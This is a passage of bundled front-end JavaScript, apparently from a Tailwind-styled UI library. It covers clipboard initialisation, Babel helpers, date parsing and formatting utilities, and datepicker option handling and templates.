    var contentType = $triggerEl.getAttribute("data-copy-to-clipboard-content-type");
    var htmlEntities = $triggerEl.getAttribute("data-copy-to-clipboard-html-entities");
    if ($targetEl) {
      if (!instances.instanceExists("CopyClipboard", $targetEl.getAttribute("id"))) {
        new CopyClipboard($triggerEl, $targetEl, {
          htmlEntities: htmlEntities && htmlEntities === "true" ? true : Default$1.htmlEntities,
          contentType: contentType ? contentType : Default$1.contentType
        });
      }
    } else {
      console.error('The target element with id "'.concat(targetId, '" does not exist. Please check the data-copy-to-clipboard-target attribute.'));
    }
  });
}
if (typeof window !== "undefined") {
  window.CopyClipboard = CopyClipboard;
  window.initClipboards = initCopyClipboards;
}
function _arrayLikeToArray(r, a) {
  (null == a || a > r.length) && (a = r.length);
  for (var e2 = 0, n2 = Array(a); e2 < a; e2++) n2[e2] = r[e2];
  return n2;
}
function _arrayWithHoles(r) {
  if (Array.isArray(r)) return r;
}
function _arrayWithoutHoles(r) {
  if (Array.isArray(r)) return _arrayLikeToArray(r);
}
function _assertThisInitialized$1(e2) {
  if (void 0 === e2) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
  return e2;
}
function _callSuper(t, o, e2) {
  return o = _getPrototypeOf$1(o), _possibleConstructorReturn$1(t, _isNativeReflectConstruct$1() ? Reflect.construct(o, e2 || [], _getPrototypeOf$1(t).constructor) : o.apply(t, e2));
}
function _classCallCheck$1(a, n2) {
  if (!(a instanceof n2)) throw new TypeError("Cannot call a class as a function");
}
function _defineProperties$1(e2, r) {
  for (var t = 0; t < r.length; t++) {
    var o = r[t];
    o.enumerable = o.enumerable || false, o.configurable = true, "value" in o && (o.writable = true), Object.defineProperty(e2, _toPropertyKey(o.key), o);
  }
}
function _createClass$1(e2, r, t) {
  return r && _defineProperties$1(e2.prototype, r), t && _defineProperties$1(e2, t), Object.defineProperty(e2, "prototype", {
    writable: false
  }), e2;
}
function _get() {
  return _get = "undefined" != typeof Reflect && Reflect.get ? Reflect.get.bind() : function(e2, t, r) {
    var p = _superPropBase(e2, t);
    if (p) {
      var n2 = Object.getOwnPropertyDescriptor(p, t);
      return n2.get ? n2.get.call(arguments.length < 3 ? e2 : r) : n2.value;
    }
  }, _get.apply(null, arguments);
}
function _getPrototypeOf$1(t) {
  return _getPrototypeOf$1 = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(t2) {
    return t2.__proto__ || Object.getPrototypeOf(t2);
  }, _getPrototypeOf$1(t);
}
function _inherits$1(t, e2) {
  if ("function" != typeof e2 && null !== e2) throw new TypeError("Super expression must either be null or a function");
  t.prototype = Object.create(e2 && e2.prototype, {
    constructor: {
      value: t,
      writable: true,
      configurable: true
    }
  }), Object.defineProperty(t, "prototype", {
    writable: false
  }), e2 && _setPrototypeOf$1(t, e2);
}
function _isNativeReflectConstruct$1() {
  try {
    var t = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {
    }));
  } catch (t2) {
  }
  return (_isNativeReflectConstruct$1 = function() {
    return !!t;
  })();
}
function _iterableToArray(r) {
  if ("undefined" != typeof Symbol && null != r[Symbol.iterator] || null != r["@@iterator"]) return Array.from(r);
}
function _iterableToArrayLimit(r, l2) {
  var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
  if (null != t) {
    var e2, n2, i2, u, a = [], f = true, o = false;
    try {
      if (i2 = (t = t.call(r)).next, 0 === l2) {
        if (Object(t) !== t) return;
        f = false;
      } else for (; !(f = (e2 = i2.call(t)).done) && (a.push(e2.value), a.length !== l2); f = true) ;
    } catch (r2) {
      o = true, n2 = r2;
    } finally {
      try {
        if (!f && null != t.return && (u = t.return(), Object(u) !== u)) return;
      } finally {
        if (o) throw n2;
      }
    }
    return a;
  }
}
function _nonIterableRest() {
  throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _nonIterableSpread() {
  throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _possibleConstructorReturn$1(t, e2) {
  if (e2 && ("object" == typeof e2 || "function" == typeof e2)) return e2;
  if (void 0 !== e2) throw new TypeError("Derived constructors may only return object or undefined");
  return _assertThisInitialized$1(t);
}
function _setPrototypeOf$1(t, e2) {
  return _setPrototypeOf$1 = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(t2, e3) {
    return t2.__proto__ = e3, t2;
  }, _setPrototypeOf$1(t, e2);
}
function _slicedToArray(r, e2) {
  return _arrayWithHoles(r) || _iterableToArrayLimit(r, e2) || _unsupportedIterableToArray(r, e2) || _nonIterableRest();
}
function _superPropBase(t, o) {
  for (; !{}.hasOwnProperty.call(t, o) && null !== (t = _getPrototypeOf$1(t)); ) ;
  return t;
}
function _toConsumableArray(r) {
  return _arrayWithoutHoles(r) || _iterableToArray(r) || _unsupportedIterableToArray(r) || _nonIterableSpread();
}
function _toPrimitive(t, r) {
  if ("object" != typeof t || !t) return t;
  var e2 = t[Symbol.toPrimitive];
  if (void 0 !== e2) {
    var i2 = e2.call(t, r);
    if ("object" != typeof i2) return i2;
    throw new TypeError("@@toPrimitive must return a primitive value.");
  }
  return String(t);
}
function _toPropertyKey(t) {
  var i2 = _toPrimitive(t, "string");
  return "symbol" == typeof i2 ? i2 : i2 + "";
}
function _typeof$1(o) {
  "@babel/helpers - typeof";
  return _typeof$1 = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(o2) {
    return typeof o2;
  } : function(o2) {
    return o2 && "function" == typeof Symbol && o2.constructor === Symbol && o2 !== Symbol.prototype ? "symbol" : typeof o2;
  }, _typeof$1(o);
}
function _unsupportedIterableToArray(r, a) {
  if (r) {
    if ("string" == typeof r) return _arrayLikeToArray(r, a);
    var t = {}.toString.call(r).slice(8, -1);
    return "Object" === t && r.constructor && (t = r.constructor.name), "Map" === t || "Set" === t ? Array.from(r) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(r, a) : void 0;
  }
}
function hasProperty(obj, prop) {
  return Object.prototype.hasOwnProperty.call(obj, prop);
}
function lastItemOf(arr) {
  return arr[arr.length - 1];
}
function pushUnique(arr) {
  for (var _len = arguments.length, items = new Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) {
    items[_key - 1] = arguments[_key];
  }
  items.forEach(function(item) {
    if (arr.includes(item)) {
      return;
    }
    arr.push(item);
  });
  return arr;
}
function stringToArray(str, separator) {
  return str ? str.split(separator) : [];
}
function isInRange(testVal, min2, max2) {
  var minOK = min2 === void 0 || testVal >= min2;
  var maxOK = max2 === void 0 || testVal <= max2;
  return minOK && maxOK;
}
function limitToRange(val, min2, max2) {
  if (val < min2) {
    return min2;
  }
  if (val > max2) {
    return max2;
  }
  return val;
}
function createTagRepeat(tagName, repeat2) {
  var attributes = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {};
  var index = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : 0;
  var html2 = arguments.length > 4 && arguments[4] !== void 0 ? arguments[4] : "";
  var openTagSrc = Object.keys(attributes).reduce(function(src, attr) {
    var val = attributes[attr];
    if (typeof val === "function") {
      val = val(index);
    }
    return "".concat(src, " ").concat(attr, '="').concat(val, '"');
  }, tagName);
  html2 += "<".concat(openTagSrc, "></").concat(tagName, ">");
  var next = index + 1;
  return next < repeat2 ? createTagRepeat(tagName, repeat2, attributes, next, html2) : html2;
}
function optimizeTemplateHTML(html2) {
  return html2.replace(/>\s+/g, ">").replace(/\s+</, "<");
}
function stripTime(timeValue) {
  return new Date(timeValue).setHours(0, 0, 0, 0);
}
function today() {
  return (/* @__PURE__ */ new Date()).setHours(0, 0, 0, 0);
}
function dateValue() {
  switch (arguments.length) {
    case 0:
      return today();
    case 1:
      return stripTime(arguments.length <= 0 ? void 0 : arguments[0]);
  }
  var newDate = /* @__PURE__ */ new Date(0);
  newDate.setFullYear.apply(newDate, arguments);
  return newDate.setHours(0, 0, 0, 0);
}
function addDays(date2, amount) {
  var newDate = new Date(date2);
  return newDate.setDate(newDate.getDate() + amount);
}
function addWeeks(date2, amount) {
  return addDays(date2, amount * 7);
}
function addMonths(date2, amount) {
  var newDate = new Date(date2);
  var monthsToSet = newDate.getMonth() + amount;
  var expectedMonth = monthsToSet % 12;
  if (expectedMonth < 0) {
    expectedMonth += 12;
  }
  var time2 = newDate.setMonth(monthsToSet);
  return newDate.getMonth() !== expectedMonth ? newDate.setDate(0) : time2;
}
function addYears(date2, amount) {
  var newDate = new Date(date2);
  var expectedMonth = newDate.getMonth();
  var time2 = newDate.setFullYear(newDate.getFullYear() + amount);
  return expectedMonth === 1 && newDate.getMonth() === 2 ? newDate.setDate(0) : time2;
}
function dayDiff$1(day, from) {
  return (day - from + 7) % 7;
}
function dayOfTheWeekOf(baseDate, dayOfWeek2) {
  var weekStart = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : 0;
  var baseDay = new Date(baseDate).getDay();
  return addDays(baseDate, dayDiff$1(dayOfWeek2, weekStart) - dayDiff$1(baseDay, weekStart));
}
function getWeek(date2) {
  var thuOfTheWeek = dayOfTheWeekOf(date2, 4, 1);
  var firstThu = dayOfTheWeekOf(new Date(thuOfTheWeek).setMonth(0, 4), 4, 1);
  return Math.round((thuOfTheWeek - firstThu) / 6048e5) + 1;
}
function startOfYearPeriod(date2, years) {
  var year = new Date(date2).getFullYear();
  return Math.floor(year / years) * years;
}
var reFormatTokens = /dd?|DD?|mm?|MM?|yy?(?:yy)?/;
var reNonDateParts = /[\s!-/:-@[-`{-~]+/;
var knownFormats = {};
var parseFns = {
  y: function y(date2, year) {
    return new Date(date2).setFullYear(parseInt(year, 10));
  },
  m: function m(date2, month, locale) {
    var newDate = new Date(date2);
    var monthIndex = parseInt(month, 10) - 1;
    if (isNaN(monthIndex)) {
      if (!month) {
        return NaN;
      }
      var monthName = month.toLowerCase();
      var compareNames = function compareNames2(name) {
        return name.toLowerCase().startsWith(monthName);
      };
      monthIndex = locale.monthsShort.findIndex(compareNames);
      if (monthIndex < 0) {
        monthIndex = locale.months.findIndex(compareNames);
      }
      if (monthIndex < 0) {
        return NaN;
      }
    }
    newDate.setMonth(monthIndex);
    return newDate.getMonth() !== normalizeMonth(monthIndex) ? newDate.setDate(0) : newDate.getTime();
  },
  d: function d(date2, day) {
    return new Date(date2).setDate(parseInt(day, 10));
  }
};
var formatFns = {
  d: function d2(date2) {
    return date2.getDate();
  },
  dd: function dd(date2) {
    return padZero(date2.getDate(), 2);
  },
  D: function D(date2, locale) {
    return locale.daysShort[date2.getDay()];
  },
  DD: function DD(date2, locale) {
    return locale.days[date2.getDay()];
  },
  m: function m2(date2) {
    return date2.getMonth() + 1;
  },
  mm: function mm(date2) {
    return padZero(date2.getMonth() + 1, 2);
  },
  M: function M(date2, locale) {
    return locale.monthsShort[date2.getMonth()];
  },
  MM: function MM(date2, locale) {
    return locale.months[date2.getMonth()];
  },
  y: function y2(date2) {
    return date2.getFullYear();
  },
  yy: function yy(date2) {
    return padZero(date2.getFullYear(), 2).slice(-2);
  },
  yyyy: function yyyy(date2) {
    return padZero(date2.getFullYear(), 4);
  }
};
function normalizeMonth(monthIndex) {
  return monthIndex > -1 ? monthIndex % 12 : normalizeMonth(monthIndex + 12);
}
function padZero(num, length) {
  return num.toString().padStart(length, "0");
}
function parseFormatString(format) {
  if (typeof format !== "string") {
    throw new Error("Invalid date format.");
  }
  if (format in knownFormats) {
    return knownFormats[format];
  }
  var separators = format.split(reFormatTokens);
  var parts = format.match(new RegExp(reFormatTokens, "g"));
  if (separators.length === 0 || !parts) {
    throw new Error("Invalid date format.");
  }
  var partFormatters = parts.map(function(token) {
    return formatFns[token];
  });
  var partParserKeys = Object.keys(parseFns).reduce(function(keys, key) {
    var token = parts.find(function(part) {
      return part[0] !== "D" && part[0].toLowerCase() === key;
    });
    if (token) {
      keys.push(key);
    }
    return keys;
  }, []);
  return knownFormats[format] = {
    parser: function parser(dateStr, locale) {
      var dateParts = dateStr.split(reNonDateParts).reduce(function(dtParts, part, index) {
        if (part.length > 0 && parts[index]) {
          var token = parts[index][0];
          if (token === "M") {
            dtParts.m = part;
          } else if (token !== "D") {
            dtParts[token] = part;
          }
        }
        return dtParts;
      }, {});
      return partParserKeys.reduce(function(origDate, key) {
        var newDate = parseFns[key](origDate, dateParts[key], locale);
        return isNaN(newDate) ? origDate : newDate;
      }, today());
    },
    formatter: function formatter(date2, locale) {
      var dateStr = partFormatters.reduce(function(str, fn2, index) {
        return str += "".concat(separators[index]).concat(fn2(date2, locale));
      }, "");
      return dateStr += lastItemOf(separators);
    }
  };
}
function parseDate(dateStr, format, locale) {
  if (dateStr instanceof Date || typeof dateStr === "number") {
    var date2 = stripTime(dateStr);
    return isNaN(date2) ? void 0 : date2;
  }
  if (!dateStr) {
    return void 0;
  }
  if (dateStr === "today") {
    return today();
  }
  if (format && format.toValue) {
    var _date = format.toValue(dateStr, format, locale);
    return isNaN(_date) ? void 0 : stripTime(_date);
  }
  return parseFormatString(format).parser(dateStr, locale);
}
function formatDate(date2, format, locale) {
  if (isNaN(date2) || !date2 && date2 !== 0) {
    return "";
  }
  var dateObj = typeof date2 === "number" ? new Date(date2) : date2;
  if (format.toDisplay) {
    return format.toDisplay(dateObj, format, locale);
  }
  return parseFormatString(format).formatter(dateObj, locale);
}
var listenerRegistry = /* @__PURE__ */ new WeakMap();
var _EventTarget$prototyp = EventTarget.prototype, addEventListener = _EventTarget$prototyp.addEventListener, removeEventListener = _EventTarget$prototyp.removeEventListener;
function registerListeners(keyObj, listeners) {
  var registered = listenerRegistry.get(keyObj);
  if (!registered) {
    registered = [];
    listenerRegistry.set(keyObj, registered);
  }
  listeners.forEach(function(listener) {
    addEventListener.call.apply(addEventListener, _toConsumableArray(listener));
    registered.push(listener);
  });
}
function unregisterListeners(keyObj) {
  var listeners = listenerRegistry.get(keyObj);
  if (!listeners) {
    return;
  }
  listeners.forEach(function(listener) {
    removeEventListener.call.apply(removeEventListener, _toConsumableArray(listener));
  });
  listenerRegistry["delete"](keyObj);
}
if (!Event.prototype.composedPath) {
  var getComposedPath = function getComposedPath2(node) {
    var path = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : [];
    path.push(node);
    var parent;
    if (node.parentNode) {
      parent = node.parentNode;
    } else if (node.host) {
      parent = node.host;
    } else if (node.defaultView) {
      parent = node.defaultView;
    }
    return parent ? getComposedPath2(parent, path) : path;
  };
  Event.prototype.composedPath = function() {
    return getComposedPath(this.target);
  };
}
function findFromPath(path, criteria, currentTarget) {
  var index = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : 0;
  var el = path[index];
  if (criteria(el)) {
    return el;
  } else if (el === currentTarget || !el.parentElement) {
    return;
  }
  return findFromPath(path, criteria, currentTarget, index + 1);
}
function findElementInEventPath(ev, selector) {
  var criteria = typeof selector === "function" ? selector : function(el) {
    return el.matches(selector);
  };
  return findFromPath(ev.composedPath(), criteria, ev.currentTarget);
}
var locales = {
  en: {
    days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
    daysShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
    daysMin: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"],
    months: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
    monthsShort: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
    today: "Today",
    clear: "Clear",
    titleFormat: "MM y"
  }
};
var defaultOptions$1 = {
  autohide: false,
  beforeShowDay: null,
  beforeShowDecade: null,
  beforeShowMonth: null,
  beforeShowYear: null,
  calendarWeeks: false,
  clearBtn: false,
  dateDelimiter: ",",
  datesDisabled: [],
  daysOfWeekDisabled: [],
  daysOfWeekHighlighted: [],
  defaultViewDate: void 0,
  // placeholder, defaults to today() by the program
  disableTouchKeyboard: false,
  format: "mm/dd/yyyy",
  language: "en",
  maxDate: null,
  maxNumberOfDates: 1,
  maxView: 3,
  minDate: null,
  nextArrow: '<svg class="w-4 h-4 rtl:rotate-180 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 10"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 5h12m0 0L9 1m4 4L9 9"/></svg>',
  orientation: "auto",
  pickLevel: 0,
  prevArrow: '<svg class="w-4 h-4 rtl:rotate-180 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 10"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 5H1m0 0 4 4M1 5l4-4"/></svg>',
  showDaysOfWeek: true,
  showOnClick: true,
  showOnFocus: true,
  startView: 0,
  title: "",
  todayBtn: false,
  todayBtnMode: 0,
  todayHighlight: false,
  updateOnBlur: true,
  weekStart: 0
};
var range$1 = document.createRange();
function parseHTML(html2) {
  return range$1.createContextualFragment(html2);
}
function hideElement(el) {
  if (el.style.display === "none") {
    return;
  }
  if (el.style.display) {
    el.dataset.styleDisplay = el.style.display;
  }
  el.style.display = "none";
}
function showElement(el) {
  if (el.style.display !== "none") {
    return;
  }
  if (el.dataset.styleDisplay) {
    el.style.display = el.dataset.styleDisplay;
    delete el.dataset.styleDisplay;
  } else {
    el.style.display = "";
  }
}
function emptyChildNodes(el) {
  if (el.firstChild) {
    el.removeChild(el.firstChild);
    emptyChildNodes(el);
  }
}
function replaceChildNodes(el, newChildNodes) {
  emptyChildNodes(el);
  if (newChildNodes instanceof DocumentFragment) {
    el.appendChild(newChildNodes);
  } else if (typeof newChildNodes === "string") {
    el.appendChild(parseHTML(newChildNodes));
  } else if (typeof newChildNodes.forEach === "function") {
    newChildNodes.forEach(function(node) {
      el.appendChild(node);
    });
  }
}
var defaultLang = defaultOptions$1.language, defaultFormat$1 = defaultOptions$1.format, defaultWeekStart = defaultOptions$1.weekStart;
function sanitizeDOW(dow, day) {
  return dow.length < 6 && day >= 0 && day < 7 ? pushUnique(dow, day) : dow;
}
function calcEndOfWeek(startOfWeek) {
  return (startOfWeek + 6) % 7;
}
function validateDate(value, format, locale, origValue) {
  var date2 = parseDate(value, format, locale);
  return date2 !== void 0 ? date2 : origValue;
}
function validateViewId(value, origValue) {
  var max2 = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : 3;
  var viewId = parseInt(value, 10);
  return viewId >= 0 && viewId <= max2 ? viewId : origValue;
}
function processOptions(options, datepicker) {
  var inOpts = Object.assign({}, options);
  var config = {};
  var locales2 = datepicker.constructor.locales;
  var _ref = datepicker.config || {}, format = _ref.format, language = _ref.language, locale = _ref.locale, maxDate = _ref.maxDate, maxView = _ref.maxView, minDate = _ref.minDate, pickLevel = _ref.pickLevel, startView = _ref.startView, weekStart = _ref.weekStart;
  if (inOpts.language) {
    var lang;
    if (inOpts.language !== language) {
      if (locales2[inOpts.language]) {
        lang = inOpts.language;
      } else {
        lang = inOpts.language.split("-")[0];
        if (locales2[lang] === void 0) {
          lang = false;
        }
      }
    }
    delete inOpts.language;
    if (lang) {
      language = config.language = lang;
      var origLocale = locale || locales2[defaultLang];
      locale = Object.assign({
        format: defaultFormat$1,
        weekStart: defaultWeekStart
      }, locales2[defaultLang]);
      if (language !== defaultLang) {
        Object.assign(locale, locales2[language]);
      }
      config.locale = locale;
      if (format === origLocale.format) {
        format = config.format = locale.format;
      }
      if (weekStart === origLocale.weekStart) {
        weekStart = config.weekStart = locale.weekStart;
        config.weekEnd = calcEndOfWeek(locale.weekStart);
      }
    }
  }
  if (inOpts.format) {
    var hasToDisplay = typeof inOpts.format.toDisplay === "function";
    var hasToValue = typeof inOpts.format.toValue === "function";
    var validFormatString = reFormatTokens.test(inOpts.format);
    if (hasToDisplay && hasToValue || validFormatString) {
      format = config.format = inOpts.format;
    }
    delete inOpts.format;
  }
  var minDt = minDate;
  var maxDt = maxDate;
  if (inOpts.minDate !== void 0) {
    minDt = inOpts.minDate === null ? dateValue(0, 0, 1) : validateDate(inOpts.minDate, format, locale, minDt);
    delete inOpts.minDate;
  }
  if (inOpts.maxDate !== void 0) {
    maxDt = inOpts.maxDate === null ? void 0 : validateDate(inOpts.maxDate, format, locale, maxDt);
    delete inOpts.maxDate;
  }
  if (maxDt < minDt) {
    minDate = config.minDate = maxDt;
    maxDate = config.maxDate = minDt;
  } else {
    if (minDate !== minDt) {
      minDate = config.minDate = minDt;
    }
    if (maxDate !== maxDt) {
      maxDate = config.maxDate = maxDt;
    }
  }
  if (inOpts.datesDisabled) {
    config.datesDisabled = inOpts.datesDisabled.reduce(function(dates, dt) {
      var date2 = parseDate(dt, format, locale);
      return date2 !== void 0 ? pushUnique(dates, date2) : dates;
    }, []);
    delete inOpts.datesDisabled;
  }
  if (inOpts.defaultViewDate !== void 0) {
    var viewDate = parseDate(inOpts.defaultViewDate, format, locale);
    if (viewDate !== void 0) {
      config.defaultViewDate = viewDate;
    }
    delete inOpts.defaultViewDate;
  }
  if (inOpts.weekStart !== void 0) {
    var wkStart = Number(inOpts.weekStart) % 7;
    if (!isNaN(wkStart)) {
      weekStart = config.weekStart = wkStart;
      config.weekEnd = calcEndOfWeek(wkStart);
    }
    delete inOpts.weekStart;
  }
  if (inOpts.daysOfWeekDisabled) {
    config.daysOfWeekDisabled = inOpts.daysOfWeekDisabled.reduce(sanitizeDOW, []);
    delete inOpts.daysOfWeekDisabled;
  }
  if (inOpts.daysOfWeekHighlighted) {
    config.daysOfWeekHighlighted = inOpts.daysOfWeekHighlighted.reduce(sanitizeDOW, []);
    delete inOpts.daysOfWeekHighlighted;
  }
  if (inOpts.maxNumberOfDates !== void 0) {
    var maxNumberOfDates = parseInt(inOpts.maxNumberOfDates, 10);
    if (maxNumberOfDates >= 0) {
      config.maxNumberOfDates = maxNumberOfDates;
      config.multidate = maxNumberOfDates !== 1;
    }
    delete inOpts.maxNumberOfDates;
  }
  if (inOpts.dateDelimiter) {
    config.dateDelimiter = String(inOpts.dateDelimiter);
    delete inOpts.dateDelimiter;
  }
  var newPickLevel = pickLevel;
  if (inOpts.pickLevel !== void 0) {
    newPickLevel = validateViewId(inOpts.pickLevel, 2);
    delete inOpts.pickLevel;
  }
  if (newPickLevel !== pickLevel) {
    pickLevel = config.pickLevel = newPickLevel;
  }
  var newMaxView = maxView;
  if (inOpts.maxView !== void 0) {
    newMaxView = validateViewId(inOpts.maxView, maxView);
    delete inOpts.maxView;
  }
  newMaxView = pickLevel > newMaxView ? pickLevel : newMaxView;
  if (newMaxView !== maxView) {
    maxView = config.maxView = newMaxView;
  }
  var newStartView = startView;
  if (inOpts.startView !== void 0) {
    newStartView = validateViewId(inOpts.startView, newStartView);
    delete inOpts.startView;
  }
  if (newStartView < pickLevel) {
    newStartView = pickLevel;
  } else if (newStartView > maxView) {
    newStartView = maxView;
  }
  if (newStartView !== startView) {
    config.startView = newStartView;
  }
  if (inOpts.prevArrow) {
    var prevArrow = parseHTML(inOpts.prevArrow);
    if (prevArrow.childNodes.length > 0) {
      config.prevArrow = prevArrow.childNodes;
    }
    delete inOpts.prevArrow;
  }
  if (inOpts.nextArrow) {
    var nextArrow = parseHTML(inOpts.nextArrow);
    if (nextArrow.childNodes.length > 0) {
      config.nextArrow = nextArrow.childNodes;
    }
    delete inOpts.nextArrow;
  }
  if (inOpts.disableTouchKeyboard !== void 0) {
    config.disableTouchKeyboard = "ontouchstart" in document && !!inOpts.disableTouchKeyboard;
    delete inOpts.disableTouchKeyboard;
  }
  if (inOpts.orientation) {
    var orientation = inOpts.orientation.toLowerCase().split(/\s+/g);
    config.orientation = {
      x: orientation.find(function(x) {
        return x === "left" || x === "right";
      }) || "auto",
      y: orientation.find(function(y3) {
        return y3 === "top" || y3 === "bottom";
      }) || "auto"
    };
    delete inOpts.orientation;
  }
  if (inOpts.todayBtnMode !== void 0) {
    switch (inOpts.todayBtnMode) {
      case 0:
      case 1:
        config.todayBtnMode = inOpts.todayBtnMode;
    }
    delete inOpts.todayBtnMode;
  }
  Object.keys(inOpts).forEach(function(key) {
    if (inOpts[key] !== void 0 && hasProperty(defaultOptions$1, key)) {
      config[key] = inOpts[key];
    }
  });
  return config;
}
var pickerTemplate = optimizeTemplateHTML('<div class="datepicker hidden">\n  <div class="datepicker-picker inline-block rounded-lg bg-white dark:bg-gray-700 shadow-lg p-4">\n    <div class="datepicker-header">\n      <div class="datepicker-title bg-white dark:bg-gray-700 dark:text-white px-2 py-3 text-center font-semibold"></div>\n      <div class="datepicker-controls flex justify-between mb-2">\n        <button type="button" class="bg-white dark:bg-gray-700 rounded-lg text-gray-500 dark:text-white hover:bg-gray-100 dark:hover:bg-gray-600 hover:text-gray-900 dark:hover:text-white text-lg p-2.5 focus:outline-none focus:ring-2 focus:ring-gray-200 prev-btn"></button>\n        <button type="button" class="text-sm rounded-lg text-gray-900 dark:text-white bg-white dark:bg-gray-700 font-semibold py-2.5 px-5 hover:bg-gray-100 dark:hover:bg-gray-600 focus:outline-none focus:ring-2 focus:ring-gray-200 view-switch"></button>\n        <button type="button" class="bg-white dark:bg-gray-700 rounded-lg text-gray-500 dark:text-white hover:bg-gray-100 dark:hover:bg-gray-600 hover:text-gray-900 dark:hover:text-white text-lg p-2.5 focus:outline-none focus:ring-2 focus:ring-gray-200 next-btn"></button>\n      </div>\n    </div>\n    <div class="datepicker-main p-1"></div>\n    <div class="datepicker-footer">\n      <div class="datepicker-controls flex space-x-2 rtl:space-x-reverse mt-2">\n        <button type="button" class="%buttonClass% today-btn text-white bg-blue-700 !bg-primary-700 dark:bg-blue-600 dark:!bg-primary-600 hover:bg-blue-800 hover:!bg-primary-800 dark:hover:bg-blue-700 dark:hover:!bg-primary-700 focus:ring-4 focus:ring-blue-300 focus:!ring-primary-300 font-medium rounded-lg text-sm px-5 py-2 text-center w-1/2"></button>\n        <button type="button" class="%buttonClass% clear-btn text-gray-900 dark:text-white bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 hover:bg-gray-100 dark:hover:bg-gray-600 focus:ring-4 focus:ring-blue-300 focus:!ring-primary-300 font-medium rounded-lg text-sm px-5 py-2 text-center w-1/2"></button>\n      </div>\n    </div>\n  </div>\n</div>');
var daysTemplate = optimizeTemplateHTML('<div class="days">\n  <div class="days-of-week grid grid-cols-7 mb-1">'.concat(createTagRepeat("span", 7, {
  "class": "dow block flex-1 leading-9 border-0 rounded-lg cursor-default text-center text-gray-900 font-semibold text-sm"
}), '</div>\n  <div class="datepicker-grid w-64 grid grid-cols-7">').concat(createTagRepeat("span", 42, {
  "class": "block flex-1 leading-9 border-0 rounded-lg cursor-default text-center text-gray-900 font-semibold text-sm h-6 leading-6 text-sm font-medium text-gray-500 dark:text-gray-400"
}), "</div>\n</div>"));
var calendarWeeksTemplate = optimizeTemplateHTML('<div class="calendar-weeks">\n  <div class="days-of-week flex"><span class="dow h-6 leading-6 text-sm font-medium text-gray-500 dark:text-gray-400"></span></div>\n  <div class="weeks">'.concat(createTagRepeat("span", 6, {
  "class": "week block flex-1 leading-9 border-0 rounded-lg cursor-default text-center text-gray-900 font-semibold text-sm"
}), "</div>\n</div>"));
var View = /* @__PURE__ */ function() {
  function View2(picker, config) {
    _classCallCheck$1(this, View2);
    Object.assign(this, config, {
      picker,
      element: parseHTML('<div class="datepicker-view flex"></div>').firstChild,
      selected: []
    });
    this.init(this.picker.datepicker.config);
  }
  return _createClass$1(View2, [{
    key: "init",
    value: function init2(options) {
      if (options.pickLevel !== void 0) {
        this.isMinView = this.id === options.pickLevel;
      }
      this.setOptions(options);
      this.updateFocus();
      this.updateSelection();
    }
    // Execute beforeShow() callback and apply the result to the element
    // args:
    // - current - current value on the iteration on view rendering
    // - timeValue - time value of the date to pass to beforeShow()
  }, {
    key: "performBeforeHook",
    value: function performBeforeHook(el, current, timeValue) {
      var result = this.beforeShow(new Date(timeValue));
      switch (_typeof$1(result)) {
        case "boolean":
          result = {
            enabled: result
          };
          break;
        case "string":
          result = {
            classes: result
          };
      }
      if (result) {
        if (result.enabled === false) {
          el.classList.add("disabled");
          pushUnique(this.disabled, current);
        }
        if (result.classes) {
          var _el$classList;
          var extraClasses = result.classes.split(/\s+/);
          (_el$classList = el.classList).add.apply(_el$classList, _toConsumableArray(extraClasses));
          if (extraClasses.includes("disabled")) {
            pushUnique(this.disabled, current);
          }
        }
        if (result.content) {
          replaceChildNodes(el, result.content);
        }
      }
    }
  }]);
}();
var DaysView = /* @__PURE__ */ function(_View) {
  function DaysView2(picker) {
    _classCallCheck$1(this, DaysView2);
    return _callSuper(this, DaysView2, [picker, {
      id: 0,
      name: "days",
      cellClass: "day"
    }]);
  }
  _inherits$1(DaysView2, _View);
  return _createClass$1(DaysView2, [{
    key: "init",
    value: function init2(options) {
      var onConstruction = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : true;
      if (onConstruction) {
        var inner = parseHTML(daysTemplate).firstChild;
        this.dow = inner.firstChild;
        this.grid = inner.lastChild;
        this.element.appendChild(inner);
      }
      _get(_getPrototypeOf$1(DaysView2.prototype), "init", this).call(this, options);
    }
  }, {
    key: "setOptions",
    value: function setOptions(options) {
      var _this = this;
      var updateDOW;
      if (hasProperty(options, "minDate")) {
        this.minDate = options.minDate;
      }
      if (hasProperty(options, "maxDate")) {
        this.maxDate = options.maxDate;
      }
      if (options.datesDisabled) {
        this.datesDisabled = options.datesDisabled;
      }
      if (options.daysOfWeekDisabled) {
        this.daysOfWeekDisabled = options.daysOfWeekDisabled;
        updateDOW = true;
      }
